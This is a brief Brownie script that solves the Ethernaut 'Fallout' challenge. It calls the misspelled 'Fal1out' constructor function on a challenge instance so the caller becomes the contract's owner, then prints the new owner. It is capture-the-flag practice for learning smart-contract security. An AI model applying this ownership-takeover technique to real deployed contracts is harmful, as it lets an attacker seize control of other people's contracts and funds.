from brownie import interface
from scripts.challenge_utils import (
    connect_to_challenge, get_acc
)
from web3 import Web3

ETHERNAUT_INSTANCE = '0x30a95cC23a8A96189748d0Da0414Ac339f69bEf7'

def main():
    connect_to_challenge()
    contract = interface.IFallout(ETHERNAUT_INSTANCE)
    acc = get_acc()

    contract.Fal1out({'from': acc})
    print(f'new owner: {contract.owner()}')

